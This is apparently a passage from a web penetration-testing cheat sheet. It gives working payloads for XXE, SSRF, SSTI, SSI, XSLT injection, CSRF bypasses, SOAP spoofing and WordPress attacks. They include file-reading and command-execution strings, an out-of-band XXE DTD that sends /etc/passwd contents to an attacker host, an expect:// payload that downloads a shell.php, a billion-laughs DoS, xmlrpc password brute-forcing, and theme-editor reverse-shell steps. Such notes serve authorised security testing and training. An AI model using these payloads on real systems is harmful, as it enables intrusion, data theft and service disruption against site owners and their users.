<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Reading PHP sourcecode

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Output the Base64 encoded version of the file index.php.

A vulnerable file-viewer within a website could be attacked with other document types as `docx`, `pdf`, etc.

#### XSS via SVG files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(1);</script>
</svg>
```

#### Injection via filename

Naming a file like 

 - `me$(cat /etc/passwd).jpg` may lead to a command injection if used in a system command
 - `me<script>alert(1)</script>.jpg` may lead to XSS if the filename is displayed
 - `me';select sleep(5); -- .jpg` may leed to SQLi if used in a SQL query.

#### Upload directroy discovery

 - Bruteforce with tools liek `gobuster`
 - Provoke a error message:
   - To long filenames (5000 characters+)
   - Reserved characters (`|`, `<`, `>`, `$`, `*`, `?`)
   - Reserved names like `CON`, `COM1`, `LPT1`, ... (Windows only) 


## Server-side attacks

#### SSRF - server-side request forgery

**Using SSRF as portscanner**

```bash
seq 1 10000 > ports.txt
ffuf -w ports.txt -u "https://pentest-experts.com/index.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "ssrf_endpoint=https://192.168.1.2:FUZZ/" -fr "Failed to connect to"
```

**Using SSRF to scan files and directories**

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "https://pentest-experts.com/index.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "ssrf_endpoint=https://192.168.1.2/FUZZ" -fr "404 Not Found"
```

**Reading files from the local filesystem via SSRF**

Use `file://` in the URL to to read loacl files - e.g. sourcecode disclosure: 

`ssrf_endpoint=file:///var/www/html/index.php`

**Using the gopher protocal to submit post requests to an internal endpoint**

Given we need to send the HTTP request

```http
POST /admin.php HTTP/1.1
Host: 192.168.1.2
Content-Length: 21
Content-Type: application/x-www-form-urlencoded

user=admin&pass=admin
```

We need to URL encode this request and use it in the gopher request as URL:

`gopher://192.168.1.2:80/_[REQUEST_GOES_HERE]`

Herby the port need to be specified, as gopher would otherwise use pot 70 as default.

This goopher url need then be URL encoded to be used in the request:

`ssrf_endpoint=gopher://192.168.1.2:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0AHost%3A%20192.168.1.2%0AContent-Length%3A%2021%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0Auser%3Dadmin%26pass%3Dadmin`

gopher%3A%2F%2F192.168.1.2%3A80%2F_POST%2520%252Fadmin.php%2520HTTP%252F1.1%250AHost%253A%2520dateserver.htb%250AContent-Length%253A%252013%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250A%250Aadminpw%253Dadmin
dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01

Useful tool: https://github.com/tarunkant/Gopherus 

**Blind SSRF**

Test if path to known existing and know non existing files or URLs produce a different outputs. 

If you see a difference in those requests (e.g. different response messages) but no additional data like the file contents in the output, SSRF is blind.

#### SSTI - server-side template injection

Test string - should break almost all templates: 

`${{<%[%'"}}%\.`

**Test payloads**

```
${7*7}
a{*comment*}b
${"z".join("ab")}
{{7*'7'}}
```

**Results**

| Output    | Engine    |
|-----------|-----------|
| `7777777` | Jinja2    |
| `49`      | Twig      |
| `ab`      | Smarty    |
| `azb`     | Mako      |
| Orig.     | Not vuln. |

**Jinja2**

**Information disclosure:**

```jinja2
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
```

**LFI:**

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

**RCE:**

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
```

**Twig**

Information disclosure:

```twig
{{ _self }}
```

**LFI (work only with the PHP Symfony framework):**

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

**RCE:**

```twig
{{ ['cat /etc/passwd'] | filter('system') }}
```

Useful tool to automate: https://github.com/vladko312/SSTImap

 - `python3 sstimap.py -u https://pentest-experts.com/index.php?q=test`  
   Run identification
 - `python3 sstimap.py -u https://pentest-experts.com/index.php?q=test -D '/etc/passwd' passwd.txt`   
   Download file
 - `python3 sstimap.py -u https://pentest-experts.com/index.php?q=test -S whoami`  
   Run OS command
 - `python3 sstimap.py -u https://pentest-experts.com/index.php?q=test --os-shell`

#### SSI - server-side includes

Information disclosure:

```
<!--#printenv -->
<!--#echo var="DOCUMENT_NAME" var="DOCUMENT_URI" var="DATE_LOCAL" var="LAST_MODIFIED" -->
```

**LFI:**

```
<!--#include virtual="config.inc.php" -->
```

(limited to files in the webroot directroy)

**RCE:**

```
<!--#exec cmd="cat /etc/passwd" -->
```

#### XSLT - Extensible stylesheet language transformation

**Information disclosure:**

```
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

**LFI:**

```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

(Need XSLT version 2.0)

**RCE:**

```
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
<xsl:value-of select="php:function('system','whoami')" />
```

(Need PHP functions to be enabled)

Try also HTTP verb tampering - so try to send `GET` requests as `POST` and vice versa to test for insufficient filtering.


## Broken authentication

 - Test for weak password policies
 - Try to enumerate users (e.g. different errors for non existent user and wornd password)
 - Try to bruteforce one account with multiple passwords, multiple accounts with one password (password spraying)
 - Try to bruteforce OTPs / 2FA tokens
 - Try to bruteforce password reset tokens
 - Try to bruteforce security questions like maiden names or city of birth with common values
 - Try to provide the correct answer for your account and then check if you can overwrite the user in the password change step - e.g.: chang the username in `POST` request data like that:  
   `user=myusername&new_password=SuperSecure1!`
 - Try to access priv. ressources (e.g. `admin.php`) without authenticating or with a normal user
 - Try to ignore redirects and check if the body contain the protected ressource.
 - Try to tamper with URL parameters related to authentication - e.g. `edit_profile.php?uid=1234`, the `uid=1234` or `role=user` Cookie, etc.
 - Try to bruteforce or reverse engineer session tokens.  
    - Thatfor obtain multiple session toekens and check the randomness of those.  
      Look out for petterns like prepended or appended strings, incrementing numbers, etc.
    - Furthermore check if the session token can be reconstructed by known values like username, user_id, etc. and combinations of those.
    - Look out for known encodings like Base64, URLencoding or HEX encoding etc.
 - Try session fixation
 - Check if logout also invalidates the session on the server and not just delete the cookies on the user side.

Useful tools: `hydra`, `ffuf`, `ZAP proxy`


## IDOR

**Test for:**

 - IDs, numbers or other identification patterns in filenames - e.g. `Bill_2024_00123.pdf`
 - IDs / UserIDs in URLs - e.g. `download.php?fid=123` or `my_files.php?uid=123`

When facing pseudo-random looking object references like `download.php?fid=202cb962ac59075b964b07152d234b70` then ceck for:

 - Encoding (Base64, Hex, ...) of known values like UserID, FileID, etc.
 - Hashes (MD5, SHA-x, ...) of known values like UserID, FileID, etc.
 - JS functions performing the hash calculation on the frontend which allow you to see how they are done.

Don't forget to test also for IDOR in APIs!


## XXE 

**DOS / full example:**

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "BOOM" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY aa "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
  <!ENTITY ab "&aa;&aa;&aa;&aa;&aa;&aa;&aa;&aa;&aa;&aa;">
  <!ENTITY ac "&ab;&ab;&ab;&ab;&ab;&ab;&ab;&ab;&ab;&ab;">
  <!ENTITY badstuff "&ac;&ac;&ac;&ac;&ac;&ac;&ac;&ac;&ac;&ac;">
]>
<profile_data>
  <name>Peter</name>
  <email>&badstuff;</email>
</profile_data>
```

**Reading local files:**

```xml
<!DOCTYPE name_or_parent_element [
  <!ENTITY badstuff SYSTEM "file:///etc/passwd">
]>
```

**Reading sorce code:**

```xml
<!DOCTYPE name_or_parent_element [
  <!ENTITY badstuff SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

(Need PHP filter to be installed and active)

To overcome this we need to provide this DTD file:

```xml
<!ENTITY badstuff "%begin;%file;%end;">
```

General entities can#t be used in the DTD but only in the document itself - that's why 

Then we can use the parameter entity `%xxe`:

```xml
<!DOCTYPE name_or_parent_element [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/index.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "https://pentest-experts.com/xxe.dtd">
  %xxe;
]>
```

(Wrap file contents in `<![CDATA[` ... `]]>` to mark it as raw data and prevent XML parser errors)

Error based XXE:

We need to provide this DTD file:

```xml
<!ENTITY % file SYSTEM "file:///var/www/html/index.php">
<!ENTITY % badstuff "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Then we can use this code to trigger the error:

```xml
<!DOCTYPE name_or_parent_element [ 
  <!ENTITY % xxe SYSTEM "https://pentest-experts.com/xxe.dtd">
  %xxe;
  %badstuff;
]>
```

**RCE:**

```xml
<!DOCTYPE name_or_parent_element [
  <!ENTITY badstuff SYSTEM "expect://curl$IFS-O$IFS'https://pentest-experts.com/shell.php'">
]>
```

(requires the PHP expect module to be installed and enabled)

Spaces, `<`, `>`, `|`, `{`, `}`, ... break the XML syntax - avoid them!

**Out of band XXE:**

Useful in a total blind situation where we see no reflected data and no error messages.

We need to provide a DTD:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY badstuff SYSTEM 'https://pentest-experts.com/get_data.php?content=%file;'>">
```

Then we need a XXE injection code:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "https://pentest-experts.com/xxe.dtd">
  %remote;
  %oob;
]>
```

... which we trigger by using `&badstuff;` in the XML document, which is defined in the DTD file.

**Tools:**

 - https://github.com/enjoiz/XXEinjector 


## Session attacks

Sessions use some form of identification to tie different HTTP requests together. This Identifier can be a:

 - GET parameter / argument
 - POST parameter / argument
 - Cookie / Web-Storage
 - Proprietary solution

#### Session Hijacking

 - XSS to get session identifiers (if Cookie is not `HTTPOnly`) 
 - CSRF to perform some action on behalf of the vistim
 - Browser histroy or logs can contain session identifiers
 - Traffic sniffing can reveal session identifiers
 - Bruteforce in case the session identifier has no sufficient randomness
 - From disk of the webserver 
   - PHP stores session in files - location is defined in `session.save_path` in `php.ini`  
     Default: `/var/lib/php/sessions/sess_[SESSIONID]`
   - Tomcat stores session in the file `SESSIONS.ser`
   - .NET stores session in:
     - the application worker process (aspnet_wp.exe), when using InProc Session mode
     - a StateServer (a Windows Service), when using OutProc Session mode
     - a SQL database

#### Session Fixation

 1. Obtain a session identifier
 2. Find a way to fixate the session identifier  
    e.g.: a redirect which hand over the session identifier in the URL for session creation
 3. Force a victim to browse this redirect with a value controlled by you

#### Weak CSRF Tokens

 - Check if anti-csrf tokens are static and not not change for each request  
   - In this case check if the tokens can be predicted  
     e.g. `md5(id)`, `sha256(username)`, `sha512(date + id)`, ...
 - Test for bypass methods:
   - Try to remove the csrf token in case the check only happens if a token is send
   - NULL value - e.g.: `?csrf=&new_email=m3g4haxx0r@pentest-experts.com` on case the test only check for presence of a token field
   - Setting a token with a random value of the same length / format (numerical, hex, string) as a valid token in casse the test only check if token fit the length / format
   - Use a known CSRF token from the attacker account in case the check is not testing if a token is tied to a speciffic account
   - Try HTTP method tampering
   - Remove referer header by `<meta name="referrer" content="no-referrer">` on the exploit page in case the CSRF token is tied to the referer

#### Double submit cookie

 - Send the CSRF token in the Cookie and HTTP GET/POST parameters and check only of those values match
 - Can be defeated by session fixation 

#### Bypassing referer URL test

 - Some anti CSRF measures are tied to the referer value, which is tested by RegEx or substing-matching
 - Can eventually be bypassed by using the expected value as subdomain or folder - e.g.:  
   - `https://victimsite.com.pentest-experts.com/csrf.html`
   - `https://pentest-experts.com/victimsite.com/csrf.html`


#### Open Redirect

 - Caused by using a not sanitized parameter in a redirect and thus allow an attacker to redirect a victim to any page from a URL of a trusted site.
 - Can also be used to steal user tokens or for session fixation


## Webservices & APIs

#### SOAP Webservice

 - Check if you can find the `WSDL` file (*= WS description*) - common URLs would be:
   - `https://soap.pentest-experts.com/wsdl.wsdl`
   - `https://soap.pentest-experts.com/wsdl?wsdl`
   - `https://soap.pentest-experts.com/?wsdl`
   - `https://soap.pentest-experts.com/disco.disco`
   - `https://soap.pentest-experts.com/disco?disco`
   - `https://soap.pentest-experts.com/?disco`
 - Try to identify not documented methods by the try & error method / fuzzing

#### SOAPAction spoofing

 1. Specify a allowed method in body - e.g. `LoginRequest` with the Parameters for the restricted method (here `cmd`):  

```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
<soap:Body>
  <LoginRequest xmlns="http://tempuri.org/">
    <cmd>whoami</cmd>
  </LoginRequest>
</soap:Body></soap:Envelope>
```

 2. Specify the restricted method in the HTTP header:  
    `SOAPAction: "ExecuteCommand"`

If the web service determines the operation to be executed based solely on the SOAPAction header, we may bypass restrictions.

#### Pay attention to `style="rpc"` in the `soap:operation` tags: 

If you see for example the following lines in WSDL:

```xml
...
<soap:operation soapAction="urn:ws-user-account#getAdminInfo" style="rpc"/>
<input> 
  <soap:body use="encoded" namesapce="urn:ws-user-account" encodeStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
...
```
You need to use the following header-line:

`SOAPAction: urn:ws-user-account#getAdminInfo`

Then get rid of all data within the `<soapenv:Envelope ...>`-tag and only use an empty tag in the body:

```xml
<soapenv:Envelope ...>
</soapenv:Envelope>
```

In RPC-style SOAP, the SOAPAction header can fully define the operation, making a body redundant.

#### API attacks

APIs can be vulnerable to the same attacks like as a website:

 - Information disclosure
 - SQLi
 - File uploads
 - LFI / RFI
 - XSS
 - CSRF / SSRF
 - XXE
 - RegExp DOS
 - etc.

Thatfor those have to be tested as thorough as the website itself!

**Approach**

 1. Fuzzing to find potential parameters / endpoints (`ffuf`)
 2. Testing for vulnerabilities (LFI, SQLi, etc.)
 3. Try encoding for parameter values (ULRencoding, Base64 encoding, ...)


## Wordpress

#### Important files and folders

 - `/index.php`  
 - `/license.txt`  
   Containing the version number 
 - `/readme.html`  
   Containing the version number 
 - `/wp-activate.php`  
   Used for email activation when setting up the site
 - `/wp-admin/`  
   Folder where the admin panel resides
 - `/wp-comments-post.php`  
 - `/wp-config.php`  
   Config file fontaining DB name, DB user, DB password, auth. keys, salts, etc.
 - `/wp-content/`  
   Main folder where plugins and themes get stored
 - `/wp-content/uploads/`  
   Folder where any file uploaded to the platform is stored
 - `/wp-cron.php`  
   Handles scheduled tasks
 - `/wp-includes/`  
   Folder where core files (certificates, fonts, JS and PHP files, widgets, ...) are stored
 - `/wp-links-opml.php`  
 - `/wp-load.php`  
   Initializes WordPress by loading the necessary configuration and core files
 - `/wp-login.php`  
 - `/wp-mail.php`  
 - `/wp-settings.php`  
   Configures the core functionality of WordPress, including loading plugin files, theme support, and initializing global variables and constants required for the application to run.
 - `/wp-signup.php`  
 - `/wp-trackback.php`  
   Handles incoming trackback requests, which are a legacy method for notifying a website that another site has linked to one of its posts.
 - `/xmlrpc.php`  
   Potential exploitation see blow (replaced by the WordPress RestAPI)

#### User roles

 - **Administrator**
 - **Editor** (Publish and manage posts, including the posts of other users)
 - **Author** (Publish and manage their own posts)
 - **Contributor** (Write and manage their own posts but cannot publish them)
 - **Subscriber** (Normal users who can browse posts and edit their profiles)

#### Wordpress manual enumration

**Version:**

 - Check WP meta-tag with the name `generator` - e.g.:  
`<meta name="generator" content="WordPress 4.4" />`
 - Check `readme.html`, `readme.txt`, `changelog.txt`, `license.txt`, ...
 - Inspect HTTP response-headers for `X-Powered-By` line
 - Check for version-info on the login-page (`wp-login.php`)
 - Check REST-API (usually under `https://pentest-expers.com/wp-json/`)
 - Analyze JS- and CSS-files for version information - e.g.:  
`https://pentest-expers.com/wp-embed.min.js?ver=4.4`
 - Inspect the `generator`-tag in RSS feed - e.g.:  
`https://pentest-expers.com/?feed=rss2`  
There you will find:  
`<generator>https://wordpress.org/?v=4.4</generator>`

**Plugins:**

```bash
curl -s -X GET 'https://pentest-expers.com/' | grep 'wp-content/plugins/*' | sed "s/'/\"/g" | sed 's/<script/""""/g' | cut -d '"' -f 6 | sort -u
```

**Themes:**

```bash
curl -s -X GET 'https://pentest-expers.com/' | grep 'wp-content/themes' | cut -d "'" -f 6 | sort -u
```

**Users:**

 - `curl -s -I -X GET https://pentest-expers.com/?author=1` - Look for response code `200` or `301`  
   Test ID 1 till ID n with ZAP, BurpSuite, ...  
   Redirect show then the username: ``
 - `curl -s -I -X GET https://pentest-expers.com/author/USERNAME` - Look for response code `200`
 - `curl https://pentest-expers.com/wp-json/wp/v2/users` - via API

**Useful tools:**

 - `wpscan`
 - `msfconsole`
 - https://github.com/xmendez/wfuzz

#### Attacking WordPress `xmlrpc.php`

Getting a list of alloed methods:

```bash
curl -ks -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" https://pentest-experts.com/xmlrpc.php
```

**Utilizing the `pingback.ping` method**

 - Call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP by pointing to an attacker-controlled host with this XML code:  

    ```xml
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param>
          <value><string>https://pentest-experts.com/</string></value>
        </param>
        <param>
          <value><string>https://blog.victim.com/2024/10/some-blog-post/</string></value>
        </param>
      </params>
    </methodCall>
    ```

 - Cross-Site Port Attack (XSPA) - call the `pingback.ping` method against itself or other internal hosts on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences - example XML:  

    ```xml
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param>
          <value><string>https://internalhost.local.lan:8080/</string></value>
        </param>
        <param>
          <value><string>https://blog.victim.com/2024/10/some-blog-post/</string></value>
        </param>
      </params>
    </methodCall>
    ```  
    This can be used as well for CSRF and SSRF (limited to only GET parameters).

**Password bruteforce:**

```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>USERNAME</value></param><param><value>PASSWORD</value></param></params></methodCall>" https://pentest-experts.com/xmlrpc.php
```  
HTTP statuscode `403` means invalid cendentials.

Using WPScan:

```bash
wpscan --url "https://pentest-experts.com" --password-attack xmlrpc -t 20 -U admin,user1,user2 -P /usr/share/wordlists/rockyou.txt 
```

#### RCE via the Theme Editor 

 - Need usually admin access or some expoit
 - Editing a file like `404.php` of a non used theme is the stealtiest approach  
   Reverse shell can be accessed by:  
   `https://pentest-experts.com/wp-content/themes/THEME-NAME/404.php`
 - Alernative approach would be editing the `404.php` of the active theme and then access a nun existent URL.

## Linux privilege escalation

 - https://roriwa.github.io/pentest/tools/LinPEAS/
 - https://gtfobins.github.io/


## Useful links

 - https://github.com/swisskyrepo/PayloadsAllTheThings
